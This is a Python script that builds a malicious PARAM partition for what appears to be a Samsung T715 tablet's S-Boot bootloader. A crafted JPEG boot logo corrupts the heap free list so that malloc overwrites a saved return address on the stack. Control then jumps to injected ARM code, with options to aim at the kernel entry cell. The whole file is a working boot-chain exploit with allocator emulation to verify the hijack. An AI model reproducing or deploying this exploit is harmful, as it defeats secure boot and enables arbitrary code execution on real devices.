#!/usr/bin/env python3

# SPDX-License-Identifier: MIT
# Copyright (c) 2026 elkir0

"""Build the split PARAM: the logo forges the DRAM heap's head so that `boot`'s malloc_large(0x200)
carves a node over the stack and its fourth word lands on a saved return address.

    venv/bin/python -I scripts/build_split.py STOCK_PARAM OUT_PARAM [--node 0x24280000] [--no-mark]

How it works (all read from the T715 S-Boot, see scripts/sbdis.py and scripts/callpath.py):
  * the decode buffer 0x24300000 ends exactly at the DRAM heap, whose only free node B0 is at
    0x24F00000 {size, free byte, prev, next}; the JPEG library never allocates there;
  * after the logo S-Boot runs `load_kernel`, then `boot`; `boot` calls 0x23e17b20 or 0x23e17b90,
    both doing malloc_large(0x200) with stack pointer 0x23EC0018 and their saved return address
    at 0x23EC0014 (init runner sp 0x23EC0110 > 0x23e035e0 > command executor > boot);
  * malloc walks head > B0 > B0.next > ..., takes B0 (free, big enough), and carves from its end:
    new = B0 + size - 0x200, a 32-bit sum, then writes {0x200, 0, B0, old B0.next} at `new`,
    so with size 0xFFFC0208 the fourth word lands at 0x23EC0014 and holds the node's address F;
  * when the function returns, pc = F: the node in the file buffer, whose first word branches to
    the code (scripts/split_source.py), which marks the screen and hands control back to `boot`.
"""

from __future__ import annotations

import argparse
import hashlib
import io
import struct
import subprocess
import sys
from pathlib import Path

from capstone import CS_ARCH_ARM, CS_MODE_ARM, Cs
from PIL import Image

sys.path.insert(0, str(Path(__file__).resolve().parent))
import build_b0 as b0  # noqa: E402
import build_calib as bc  # noqa: E402
import build_hijack as bh  # noqa: E402
import split_source  # noqa: E402

HEAD = 0x23EC1048
B0 = 0x24F00000
NEED = 0x200
BOOT_SP = 0x23EC0018              # boot's stack pointer while it calls the two functions
SAVED_LR = BOOT_SP - 4            # 0x23EC0014


def size_for(node_address: int) -> int:
    """B0's size so that the carved node starts 12 bytes below the saved return address."""
    return (SAVED_LR - 12 - B0 + NEED) & 0xFFFFFFFF


def emulate(b0_bytes: bytes, file_bytes: bytes, need: int) -> list[tuple[str, int, int]]:
    """Play malloc's walk and split as FUN_23E07080 does it; return the writes.

    Three places are modelled: the list head (its next is B0, as after S-Boot's init), B0 as the
    decoded image leaves it, and the file buffer as the logo file fills it.
    """
    ram = bytearray(16)
    ram[:16] = b0_bytes
    head = bytearray(16)
    stack_base, stack = 0x23EC0000, bytearray(0x110)       # S-Boot's stack, sp 0x23EC0110 downwards
    extra: dict[int, int] = {}

    def u32(address):
        if B0 <= address <= B0 + 12:
            return struct.unpack_from("<I", ram, address - B0)[0]
        if HEAD <= address <= HEAD + 12:
            return struct.unpack_from("<I", head, address - HEAD)[0]
        if bh.FILE_BUFFER <= address <= bh.FILE_BUFFER + len(file_bytes) - 4:
            return struct.unpack_from("<I", file_bytes, address - bh.FILE_BUFFER)[0]
        if stack_base <= address <= stack_base + len(stack) - 4:
            return struct.unpack_from("<I", stack, address - stack_base)[0]
        return extra.get(address, 0)                 # S-Boot's own data: whatever it holds is replaced

    writes: list[tuple[str, int, int]] = []

    def store(address, value, what):
        writes.append((what, address, value))
        if B0 <= address <= B0 + 12:
            struct.pack_into("<I", ram, address - B0, value)
        elif HEAD <= address <= HEAD + 12:
            struct.pack_into("<I", head, address - HEAD, value)
        elif bh.FILE_BUFFER <= address <= bh.FILE_BUFFER + len(file_bytes) - 4:
            struct.pack_into("<I", file_bytes, address - bh.FILE_BUFFER, value)
        elif stack_base <= address <= stack_base + len(stack) - 4:
            struct.pack_into("<I", stack, address - stack_base, value)
        else:
            extra[address] = value

    struct.pack_into("<I", head, 8, B0)                 # head.prev
    struct.pack_into("<I", head, 12, B0)                # head.next
    file_bytes = bytearray(file_bytes)
    need16 = (need + 15) & ~15
    node, best = u32(HEAD + 12), 0
    for _ in range(16):
        if node == HEAD:
            break
        if u32(node + 4) & 0xFF:                       # free
            if need16 <= u32(node):
                if best == 0 or u32(node) < u32(best):
                    best = node
        node = u32(node + 12)
    else:
        return [("walk never came back to the head", 0, 0)]
    if best == 0:
        return [("no block big enough", 0, 0)]
    rest = (u32(best) - need16) & 0xFFFFFFFF
    if rest <= 0x1F:
        return [("block taken whole, no write", best, 0)]
    new = (best + rest) & 0xFFFFFFFF
    store(new, need16, "size")
    store(new + 4, 0, "flag")
    store(new + 8, best, "prev")
    store(new + 12, u32(best + 12), "next")
    store(u32(best + 12) + 8, new, "next->prev")
    store(best + 12, new, "block.next")
    store(best, u32(best) - need16 - 16, "block.size")
    return writes


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument("stock_param", type=Path)
    parser.add_argument("out_param", type=Path)
    parser.add_argument("--node", type=lambda t: int(t, 0), default=0x24220000, help="F: the node in the file buffer, past the image and far from any sector boundary")
    parser.add_argument("--no-mark", action="store_true", help="no delay before handing back")
    parser.add_argument("--ffree", action="store_true", help="B0 busy and pointing at a false free block in the file buffer, whose next is the code node")
    parser.add_argument("--kentry", action="store_true", help="aim at S-Boot's kernel entry cell 0x23E56810, then jump to the kernel")
    parser.add_argument("--out-jpeg", type=Path)
    parser.add_argument("--carve", type=lambda t: int(t, 0), help="where the carved node starts (T), instead of the stack")
    parser.add_argument("--width", type=lambda t: int(t, 0), default=16378)
    parser.add_argument("--height", type=lambda t: int(t, 0), default=264, help="1521 x 2757 changes only B0's 16 bytes and 20 more")
    args = parser.parse_args()

    work = args.out_param.parent
    source = (split_source.FFREE_SOURCE if args.ffree else split_source.KENTRY_SOURCE if args.kentry
                else split_source.MARK_SOURCE)
    code_node = args.node + 0x100 if args.ffree else args.node
    if args.no_mark:
        source = source.replace("ldr     r0, =0xA0000000", "ldr     r0, =0x100")
    (work / "mark.S").write_text(source)
    subprocess.run(["clang", "--target=arm-none-eabi", "-mcpu=cortex-a53", "-fno-asynchronous-unwind-tables", "-c",
                    "-o", str(work / "mark.o"), str(work / "mark.S")], check=True)
    code = bh.elf_text(work / "mark.o")
    md = Cs(CS_ARCH_ARM, CS_MODE_ARM)
    print(f"code at F, {len(code)} bytes, read back:")
    for ins in md.disasm(code[:4], code_node):
        print(f"    {ins.address:08x}  {ins.mnemonic:8s} {ins.op_str}")
    print(f"    {code_node + 4:08x}  node: flag 0, room for the allocator, next {HEAD:#010x}: {code[4:16].hex(' ')}")
    for ins in md.disasm(code[16:], code_node + 16):
        print(f"    {ins.address:08x}  {ins.mnemonic:8s} {ins.op_str}")
    first = next(md.disasm(code[:4], code_node))
    if first.mnemonic != "b" or int(first.op_str.lstrip("#"), 0) != code_node + 16:
        raise SystemExit("the first word must branch to F+16")
    if code[4:16] != struct.pack("<III", 0, 0, HEAD):
        raise SystemExit("the node's words 1 to 3 must be 0, 0, head")

    size = ((args.carve - B0 + NEED) & 0xFFFFFFFF) if args.carve else size_for(args.node)
    if args.kentry:
        args.carve = 0x23E56810 - 12
        size = (args.carve - B0 + NEED) & 0xFFFFFFFF
    logo = args.out_jpeg or (work / "split-logo.jpg")
    command = [sys.executable, "-I", str(Path(__file__).resolve().parent / "build_b0.py"), str(args.stock_param),
               str(args.out_param), "--out-jpeg", str(logo), "--width", str(args.width), "--height", str(args.height)]
    if args.ffree:
        block = args.node                      # B0 busy -> F free -> F2 busy -> head
        block_size = (SAVED_LR - 12 - block + NEED) & 0xFFFFFFFF
        tail = struct.pack("<IB3xII", block_size, 1, 0, code_node) + bytes(0xF0) + code
        command += ["--size", "0", "--flag", "0", "--prev", "0", "--next", hex(block), "--no-next-search",
                    "--tail", f"{block:#x}={tail.hex()}"]
    else:
        command += ["--size", hex(size), "--prev", "0", "--next", hex(args.node),      # the free byte: whatever encodes
                    "--tail", f"{args.node:#x}={code.hex()}"]
    print("$ " + " ".join(command[2:]))
    run = subprocess.run(command, capture_output=True, text=True)
    sys.stdout.write(run.stdout)
    if run.returncode:
        sys.stderr.write(run.stderr)
        return run.returncode

    file_bytes = logo.read_bytes()
    with Image.open(io.BytesIO(file_bytes)) as image:
        image.load()
        raw = image.tobytes()
    stride = (image.size[0] * 3 + 3) & ~3
    row, col = divmod(B0 - bc.DECODE_BUFFER, stride)        # Pillow's rows have no stride padding
    index = row * image.size[0] * 3 + col
    b0_bytes = raw[index:index + 16]
    print(f"emulation of boot's malloc_large({NEED:#x}) on the decoded image:")
    for what, address, value in emulate(b0_bytes, file_bytes, NEED):
        note = ("  <- the saved return address of 0x23e17b20 / 0x23e17b90" if address == SAVED_LR else
                "  <- S-Boot's kernel entry cell" if address == 0x23E56810 else "")
        print(f"    [{address:#010x}] = {value:#010x}   {what}{note}")
    writes = emulate(b0_bytes, file_bytes, NEED)
    wanted = (args.carve + 12) if args.carve else SAVED_LR
    if not any(a == wanted and v == code_node for _, a, v in writes):
        print("FAIL: nothing lands on the saved return address with the node's address")
        return 1
    print(f"PARAM {args.out_param}: sha256 {hashlib.sha256(args.out_param.read_bytes()).hexdigest()}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
